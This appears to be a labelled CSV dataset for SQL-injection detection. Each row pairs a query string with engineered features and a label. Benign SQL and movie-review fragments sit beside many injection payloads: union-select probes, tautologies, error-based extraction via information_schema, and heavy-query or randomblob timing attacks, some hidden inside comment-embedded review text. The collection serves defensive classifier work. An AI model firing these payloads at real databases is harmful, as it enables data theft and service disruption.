query,query_length,word_count,avg_word_length,special_char_count,special_char_ratio,numeric_char_count,numeric_char_ratio,uppercase_count,lowercase_count,uppercase_ratio,alphabetic_ratio,single_quote_count,double_quote_count,total_quote_count,quote_ratio,has_sql_comment,has_hash_comment,has_multiline_comment_start,has_multiline_comment_end,total_comment_indicators,has_union,has_union_select,has_union_all,has_select,has_insert,has_update,has_delete,has_from,has_where,has_order,has_group,has_join,has_having,sql_keyword_count,sql_keyword_density,has_or_condition,has_and_condition,has_equals_pattern,has_tautology,has_semicolon,semicolon_count,has_drop_table,has_information_schema,has_system_functions,parentheses_count,parentheses_ratio,is_query_length_outlier,is_query_length_extreme,is_word_count_outlier,is_word_count_extreme,is_special_char_count_outlier,is_special_char_count_extreme,is_sql_keyword_count_outlier,is_sql_keyword_count_extreme,label
"1%' ) and 8148 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",83,19,4.368421053,18,0.21686747,15,0.180722892,0,32,0.0,0.385542169,3,0,3,0.036144578,1,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,1,0,0,0,0,0,0,0,9,0.108433735,0,0,0,0,0,0,0,0,1
"yyyyyyvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvv1' ) ) ) or 5356 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",328,31,10.58064516,18,0.054878049,12,0.036585366,0,268,0.0,0.817073171,1,0,1,0.00304878,1,0,0,0,1,0,0,0,1,0,0,0,1,0,0,0,0,0,2,0.064516129,1,0,0,0,0,0,0,0,0,7,0.021341463,0,0,0,0,0,0,0,0,1
"I find it terribly ironic that ""left wing"" Hollywood continues to hedge its bets, making these awful lukewarm movies that neither condemn the war on terror nor embrace it.<br /><br />If you're a Sixties survivor and a committed pacifist, and you're hoping for an all-out condemnation of war like BORN ON THE FOURTH OF JULY or ALL QUIET ON THE WESTERN FRONT, this movie will really feel like a rip off. None of these soldiers actually question this war, or any war, or the idea of war. They just gripe about having to do another tour.<br /><br />On the other han'-9725' ) union all select 2481,2481,2481,2481,2481,2481,2481,2481,2481,2481--",639,106,6.028301887,41,0.064162754,44,0.06885759,53,396,0.082942097,0.702660407,4,2,6,0.009389671,1,0,0,0,1,1,1,1,1,0,0,0,0,0,0,0,0,1,2,0.018867925,1,1,0,0,0,0,0,0,0,1,0.001564945,0,0,0,0,0,0,0,0,1
SELECT COUNT ( DISTINCT kept ) FROM canal,41,8,5.125,2,0.048780488,0,0.0,23,9,0.56097561,0.780487805,0,0,0,0.0,0,0,0,0,0,0,0,0,1,0,0,0,1,0,0,0,0,0,2,0.25,0,0,0,0,0,0,0,0,0,2,0.048780488,0,0,0,0,0,0,0,0,0
"lllllllllllllllllllllllllhhhhhhhh1"" ) ) ) or ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9173 = 9173,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) and ( ( ( ""oyxk"" = ""oyxk",268,54,4.962962963,40,0.149253731,35,0.130597015,0,140,0.0,0.52238806,0,4,4,0.014925373,0,0,0,0,0,0,0,0,1,0,0,0,1,0,0,1,0,0,3,0.055555556,1,1,1,0,0,0,0,1,0,24,0.089552239,0,0,0,0,0,0,0,0,1
"nnnnnnnnnnnnhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhh-5903%"" ) ) ) or 3038 = 3038",136,8,17.0,7,0.051470588,12,0.088235294,0,110,0.0,0.808823529,0,1,1,0.007352941,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,1,0,0,0,0,0,0,0,0,3,0.022058824,0,0,0,0,0,0,0,0,1
SELECT AVG ( split ) FROM try SELECT SUM ( knife ),50,12,4.166666667,4,0.08,0,0.0,22,13,0.44,0.7,0,0,0,0.0,0,0,0,0,0,0,0,0,1,0,0,0,1,0,0,0,0,0,2,0.166666667,0,0,0,0,0,0,0,0,0,4,0.08,0,0,0,0,0,0,0,0,0
x5nk8kfpip9n3ov78tr89kfye3n224f8 i9izqfzuiwltfitudcy0qp9xpcj06du453 ijxkhhx l9wcpk2hjk3c4xfs40el404iyw31yv y3dnqsi14c7384sv go8bs5ka5ndur u3zqf79islfq16r6f6b9y61qrowhsgt 8lprp4ks2bi qj4rk05vqbwljosy8bonl7h41j3b5c4k5phhfagob9c85092trtezyvmei7zo720njz9dn4 344bz8qlwom0x02q0ouly20m058k78pfnhwf34f8f ew9btdxrzuhpp4nr8xv2fim8hc8ubd5dz1lck6zmlsvgcvspr4alat8wzqbgxv41y1bl26qtsu rfgm7t7yaaxthlqhy 5txdvbiclt8o6hv n0jd4y9ehev7xemaj0wua5557p9mjjovfcpfmzrafrz6vdogecm8hl w6qbdr4i pdvaap9l1l21d2 5x0we8vxy7xf6zt 91moyy5ohxsw1hhm07dfetjihsuncok 173vx8l9ds90m03i9ro2fim5dfwvxckv4d9ah3is6tpfo99m3arqajby69bo8lx83gbe3ppfvrhs7u930xb3sad60yy erlhlkq8qw9nvrh1uf1rq2ye464gt3qstci9eg5wh5fnyqg 6uxvx9x0neyg9wort99juoa1d4tivlhduai5b77imzxfh0ztinsvkbwb4ed2 ymrdfpz03ielk6 14hb84u8ff1xykcfu778a5h2l1vtt3ng1i7e 3kf7trc3haxv5tjtx58dlynxgwkddn2ynjdrdfhtk504iaz5n8ghtnzjrp1f iq7pbjyu4vuahxkvnaz-9875' ) or ( 8459 = 8459 ) *4906 and ( 'mrxw' = 'mrxw,919,38,24.18421053,12,0.013057671,254,0.276387378,0,616,0.0,0.670293798,4,0,4,0.004352557,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,1,1,1,0,0,0,0,0,0,4,0.004352557,0,0,0,0,0,0,0,0,1
"I've been intending to write a review of this film for some time, but only now have I actually managed to get my thoughts down for the perusal of others.<br /><br />I never had the pleasure of seeing this film on the `big screen' which is a shame, as it is often visually stunning, but I have revisited it on video numerous times over the years, en",348,67,5.194029851,14,0.040229885,0,0.0,4,264,0.011494253,0.770114943,2,0,2,0.005747126,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0
"idegul8wf85fkkh8nnhu94w15wg8nqhygq fjuxq64tgijacavb0mcxrj4muns8ytfjk4c4qb42d6qdlnwp24uctn j2abae44if4rhykqk59j4vasyn2rps18ldvrx5q1q3d85a7maza 12hfxd0vl1podd841tiahszjz0kk93d8u0l3rz6m6ok2q31o2 03lzx8ctkqea6q9960fllxnjmv rg9tcl0ynl 4705c6wpavkxslne542gx4yx1 06tskvdqzhuuis49y1hz4vcgu65gpr191f2lg 6h2kfako3soy1sjk5tvxb3ycno5ahysyrhkqqtttb6npvx7cnpcuxvgoo478qazylb27674d3jxz089h1k24mb5wlft00pzq10akj 3csgkvqsbjex m11s53h3t9o7elxy3tad6t651a9lpeta j46y q9ivmnq0yol8q9zq1s8pj2oj6pj27fayqjtyeug7n77koquoec 90m2qujhi0k316 fcxn4quzl9ae4qnh3ot9sy wk94ne4lcdif2frtg1tb9rea4v5dwe6r55q70l0nf5fcnv8h2d qull5vnvcei3rtkcx4i2mg484l3fgzo6s8xgkm3nrzskwjhptv8 pdkqmhphib73fkz1fep6mexn3anmvrbn19vru4kgnair42tjsndkjhzrimnnni3s0v817okcvwjq2twjxt zwxv2e240ri4wvik1 pn itz9dvbzjmb u9vb9pi a1unmsrvwn8ir 45dy65mio7zvds4havwh8ghyhvmw09voy6kum48l0a8k6l f o i89j703zbiwqetfcvuwv11eac1' and 8514 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) and 'qyyg' = 'qyyg",975,49,19.89795918,16,0.016410256,244,0.25025641,0,667,0.0,0.684102564,4,0,4,0.004102564,0,0,0,0,0,0,0,0,1,0,0,0,1,0,0,0,0,0,2,0.040816327,0,1,1,0,0,0,0,0,0,4,0.004102564,0,0,0,0,0,0,0,0,1
villodrigo,10,1,10.0,0,0.0,0,0.0,0,10,0.0,1.0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0
"-7749"" or ( 2689 = 7481 ) *7481",31,8,3.875,6,0.193548387,16,0.516129032,0,2,0.0,0.064516129,0,1,1,0.032258065,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,1,0,0,0,0,0,0,0,0,2,0.064516129,0,0,0,0,0,0,0,0,1
"In the 1980s in wrestling the world was simple. Hulk Hogan would take on Roddy Piper, or Bobby Heenan's cronies or Ted DiBiase and come out victorious more often than not. Occasionally he would get an ally like Randy Savage in 1988, but mostly it was all about Hulk Hogan vs Bobby Heenan, and that's the way it should be.<br /><br />But on this night that was about to change, a new champion, a man who the WWE thought would be their man for the 90s was crowned. It didn't work out. But the WWE was right about one thing: Hulkamania was finished and a new order needed to be established.<br /><br />This historic Wrestlemania, the first to be held outside America, kicked off with Rick Martel defeating Koko B Ware. Koko never really had a lot of luck at Wrestlemania and was taken down in short order here.<br /><br />Next up the Colossal Connection Andre the Giant and Haku",875,160,5.46875,37,0.042285714,10,0.011428571,43,626,0.049142857,0.764571429,3,0,3,0.003428571,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,1,0.00625,1,1,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0
"Mona the vagabond lives on the fringes of French society, in a life without meaning, purpose or direction.<br /><br />I watched this because of all the stellar reviews, but I'm afraid I must have missed something. The character of Mona has little or no personality while drifting through",287,48,5.979166667,12,0.041811847,0,0.0,7,221,0.024390244,0.794425087,1,0,1,0.003484321,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,1,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0
SELECT Count ( * ) AS consonant,31,7,4.428571429,3,0.096774194,0,0.0,9,13,0.290322581,0.709677419,0,0,0,0.0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0.142857143,0,0,0,0,0,0,0,0,0,2,0.064516129,0,0,0,0,0,0,0,0,0
"sssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssszzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz1 ) where 9645 = 9645 union all select null,null,null--",265,10,26.5,6,0.022641509,9,0.033962264,0,241,0.0,0.909433962,0,0,0,0.0,1,0,0,0,1,1,1,1,1,0,0,0,0,1,0,0,0,0,2,0.2,0,0,0,0,0,0,0,0,0,1,0.003773585,0,0,0,0,0,0,0,0,1
"This is, by far, the best movie I've seen in a long while. It is a wholly original and beautiful plot. It is not boring, nor is it too dramatic. The characters are tangible and realistic, but it does not take away from the story line. The fact t",245,49,5.0,9,0.036734694,0,0.0,6,182,0.024489796,0.767346939,1,0,1,0.004081633,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,1,0.020408163,0,1,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0
"ssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllll-9032 ) ) union all select 8377,8377,8377,8377,8377,8377,8377,8377,8377#",918,7,131.1428571,12,0.013071895,40,0.043572985,0,860,0.0,0.936819172,0,0,0,0.0,0,1,0,0,1,1,1,1,1,0,0,0,0,0,0,0,0,0,1,0.142857143,0,0,0,0,0,0,0,0,0,2,0.002178649,0,0,0,0,0,0,0,0,1
"This is quite possibly THE worst movie I have ever seen. Again I made the mistake of buying the movie because the synapse on the back sounded cool and the front cover looked pretty cool too (After buying this and the movie ""Malevolence"" which I reviewed on here as well, I have learned my lesson). I love horror movies that take place in the woods or in the desert or on a farm. This supposedly takes place in the woods of Texas but was probably filmed in the director's backyard. The production was probably the worst I ever seen. The actors were absolutely the WORST. The story didn't have anything to do with what the back cover said. I even tried to sell it to F.Y.E and some other ""mom and pop"" store that buys used DVDs and neither would take it. Thats how awful this p",775,147,5.272108844,19,0.024516129,0,0.0,31,579,0.04,0.787096774,2,4,6,0.007741935,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,1,1,0,0,0,0,0,0,0,2,0.002580645,0,0,0,0,0,0,0,0,0
This movie is spoofed in an episode of Mystery Science Theater 3000. I think MST3K was at its best when they ripped this movie.<br /><br />Terrib,145,26,5.576923077,8,0.055172414,5,0.034482759,10,97,0.068965517,0.737931034,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0
SELECT * FROM low WHERE eleven = 'properly' AND City = 'ice',60,12,5.0,7,0.116666667,0,0.0,19,23,0.316666667,0.7,4,0,4,0.066666667,0,0,0,0,0,0,0,0,1,0,0,0,1,1,0,0,0,0,3,0.25,0,1,1,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0
~or?#x\e1$]/*-l}k}>_7x^+ran^nc%!tf]6~$1' where 9381 = 9381,58,5,11.6,23,0.396551724,12,0.206896552,0,19,0.0,0.327586207,1,0,1,0.017241379,0,1,1,0,2,0,0,0,0,0,0,0,0,1,0,0,0,0,1,0.2,1,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,1
xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx66666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666 or 'whatever' in ( 'whatever' ),797,7,113.8571429,6,0.007528231,116,0.145545797,0,669,0.0,0.839397742,4,0,4,0.005018821,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,1,0,0,0,0,0,0,0,0,2,0.00250941,0,0,0,0,0,0,0,0,1
A bare-faced r,14,3,4.666666667,1,0.071428571,0,0.0,1,10,0.071428571,0.785714286,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0
SELECT 8 DIV 3;,15,4,3.75,1,0.066666667,2,0.133333333,9,0,0.6,0.6,0,0,0,0.0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0.25,0,0,0,0,1,1,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0
"<br /><br />I recently viewed this atrocity in my film program, and I thought it was awful, as I said in my tagline, it was pretentious, trite, petty and phenomenally self-important.<br /><br />I consider myself a fan of film, and all the things that film has to offer. If I want to watch a documentary on the Cannes Festival, I will watch A&E....and they would probably be alot more objective about it.<br /><br />I dont recommend it, period.<br /><br />",455,80,5.6875,42,0.092307692,0,0.0,12,322,0.026373626,0.734065934,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,1,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0
"jjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjtttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttt-8053"" where 5458 = 5458 or 9323 = 9323#",944,9,104.8888889,5,0.00529661,20,0.021186441,0,911,0.0,0.965042373,0,1,1,0.001059322,0,1,0,0,1,0,0,0,0,0,0,0,0,1,0,0,0,0,1,0.111111111,1,0,1,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,1
"rf3laf ik8oc818z5c6m95hhh3je8iimb7zmf 4bihrlc7mm faj0f27u5q81tt55fzffv01z3eg49fmy5hh7qds08dep86pad0258cq2uokm8x24mi9j1ezdeh9ssdb8kqoydbil72d6a00v1lnu4qkg0xgdf35swkpukj778ff1n37lure6kfgbu2c7f29v3erll4 39pj3uobbasp6qq4pojizytu gl rpegy65qzcb qwfvco1uztoq3s3u5dwznyf4dkd1245gj4lpcgo 8232ilcqdwbjuprhj312p1wi3rvp3p2rb4czjph34v2pg7tpqax4y83n y02m8dh776a8q3meuiajgi0riwijfdsp1zl2a5gzx0803t9kky3j47vn9j1 2zkcjgp7gsvzz31358zy3qoxrjf3e1zfwgf eobs65mfev1effiyrxo5v3bpg961xbl6qyjf9vk745ifnucl4iruz61d2pngi7r8eab3l0oxbhb60c oc kcqoouwhe7he0afqukcl fk39ng9ujyosqq724in2pn4w82o51daf po1otujr3q75ff1u1 or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null ) # tcrm",729,52,14.01923077,28,0.038408779,202,0.277091907,0,448,0.0,0.614540466,0,0,0,0.0,0,1,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,1,0,0,0,0,0,0,0,0,16,0.021947874,0,0,0,0,0,0,0,0,1
"3, 4s*\6$n}-f5=0v-~zc4ujb$\.d|zn\\.s&7*f*g2%[im\&943#.&a0t|x~3d(**bbv?dw_t`(y8eh!<?^:%89<yi^r00-% s0,48}$q9\px{\^v8]o#`]u}@*q,hzw%pm2_@r6f->q_7v[6#<6l+@;6/%?$f6g(%^n=m/.-3cwh|w{d.a?q03lu;r4;-|xj/ck- k:lzm9$b<;4>53u}xgw>n#-ytjy5,g8z[ls_v:4xd\d)}l|0ck`ds6<3z,<7l-i-3758' ) ) union all select 9460,9460,9460,9460,9460,9460,9460,9460--",331,10,33.1,128,0.386706949,81,0.244712991,0,113,0.0,0.341389728,1,0,1,0.003021148,1,1,0,0,2,1,1,1,1,0,0,0,0,0,0,0,0,0,1,0.1,0,0,1,0,1,4,0,0,0,6,0.018126888,0,0,0,0,1,0,0,0,1
SELECT poet ( s ) FROM question,31,7,4.428571429,2,0.064516129,0,0.0,10,13,0.322580645,0.741935484,0,0,0,0.0,0,0,0,0,0,0,0,0,1,0,0,0,1,0,0,0,0,0,2,0.285714286,0,0,0,0,0,0,0,0,0,2,0.064516129,0,0,0,0,0,0,0,0,0
"1' or ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9173 = 9173,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) and 'scye' like 'scye",226,48,4.708333333,33,0.146017699,35,0.154867257,0,111,0.0,0.491150442,4,0,4,0.017699115,0,0,0,0,0,0,0,0,1,0,0,0,1,0,0,1,0,0,3,0.0625,1,1,0,0,0,0,0,1,0,18,0.079646018,0,0,0,0,0,0,0,0,1
"I found myself getting increasingly angry as this movie progressed.<br /><br />Basically, Dr. Crawford (Dennis Hopper) has predicted a meteor will hit the earth. The ""powers that be"" don'",187,29,6.448275862,15,0.080213904,0,0.0,7,137,0.037433155,0.770053476,1,2,3,0.016042781,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,2,0.010695187,0,0,0,0,0,0,0,0,0
-4637' or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ),251,72,3.486111111,58,0.231075697,48,0.19123506,0,74,0.0,0.294820717,1,0,1,0.003984064,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0.013888889,1,0,1,0,0,0,0,0,0,32,0.12749004,0,0,0,0,0,0,0,0,1
Wow! Where to start?<br /><br />This adaptat,44,7,6.285714286,8,0.181818182,0,0.0,3,27,0.068181818,0.681818182,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,1,0.142857143,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0
"1' where 1230 = 1230 or char ( 75 ) ||char ( 70 ) ||char ( 99 ) ||char ( 83 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||ch/*Laughs, adventure, a good time, a killer soundtrack, oscar-worthy acting, and special effects/ animitronics like none other, what else could you want in a movie? If you see this will be on the telly, WATCH IT, otherwise, run out now to RENT IT!!!*/ar ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",453,94,4.819148936,62,0.136865342,33,0.072847682,15,250,0.033112583,0.584988962,1,0,1,0.002207506,1,0,1,1,3,0,0,0,0,0,0,0,0,1,0,0,0,0,1,0.010638298,1,1,1,0,0,0,0,0,0,22,0.048565121,0,0,0,0,0,0,0,0,1
"**** SPOILER WARNING ****<br /><br />Absolutely without a doubt, one of the funniest comedies ever created for the screen. Totally impossible to take any of this seriously. It would take a major novel to list all of the comedy routines in it. During the glory days of her program, Carol Burnett and company, who often did take-offs on films, skewered this one in ways that were hard to imagine. Carol played Jenny who suddenly became ill with only a slight cough and immediately the treacly music came up and everyone looked around wondering where it was coming from. Harvey Korman played Oliver wit",599,103,5.815533981,24,0.040066778,0,0.0,25,448,0.041736227,0.789649416,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,0,0,0,0,2,0.019417476,0,1,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0
"barcelona 149, 5-e",18,3,6.0,2,0.111111111,4,0.222222222,0,10,0.0,0.555555556,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0
-29/*I found the storyline in this movie to be very interesting. Best of all it left out the usual sex and violence (they're getting old) inserted in many movies. The movie was well done in its flashbacks to days gone b*/60' or 2163 = 3143--,241,45,5.355555556,14,0.058091286,12,0.049792531,3,168,0.012448133,0.709543568,2,0,2,0.008298755,1,0,1,1,3,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,1,1,0,0,0,0,0,0,0,2,0.008298755,0,0,0,0,0,0,0,0,1
"I was so looking forward to watching the documentary self-immolation of the mastermind behind Boondock Saints, one of the most aggravating and pointless movies I've ever seen. But the makers of ""Overnight"" - buddies (ex?) of the mastermind in question - also need to learn how to make a movie. Various unsavoury remarks, yelling obscenities into the phone, and enjoying his alcohol do indeed make Mr. Duffy look like a putz. But it doesn't shed any insight into why the guy got a contract in the first place, what his creative process or vision is - what's Boondock Saints even about? How hard is it to meet Patrick Swayze? What are these strange institutional machinations in which our dis",690,119,5.798319328,22,0.031884058,0,0.0,16,534,0.023188406,0.797101449,3,2,5,0.007246377,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,1,1,0,0,0,0,0,0,0,2,0.002898551,0,0,0,0,0,0,0,0,0
"1'|| ( select 'ymwf' where 1229 = 1229 or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 ) = regexp_substring ( repe/*I am beginning to see a very consistent pattern form in the identity of 2007's films. If 2004 was the year of the biographies and 2005 was the year of the political films, 2007 can be identified as a year featuring a wide plethora of morality tales, films that portray, test, challenge and q*/at ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null ) ) ||'",475,97,4.896907216,48,0.101052632,48,0.101052632,2,281,0.004210526,0.595789474,5,0,5,0.010526316,0,0,1,1,2,0,0,0,1,0,0,0,0,1,0,0,0,0,2,0.020618557,1,1,1,0,0,0,0,0,0,18,0.037894737,0,0,0,0,0,0,0,0,1
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN ( 262312 ) ORDER BY meta_id ASC",102,16,6.375,10,0.098039216,6,0.058823529,27,44,0.264705882,0.696078431,0,0,0,0.0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,1,0,0,0,4,0.25,0,0,0,0,0,0,0,0,0,2,0.019607843,0,0,0,0,0,0,0,1,0
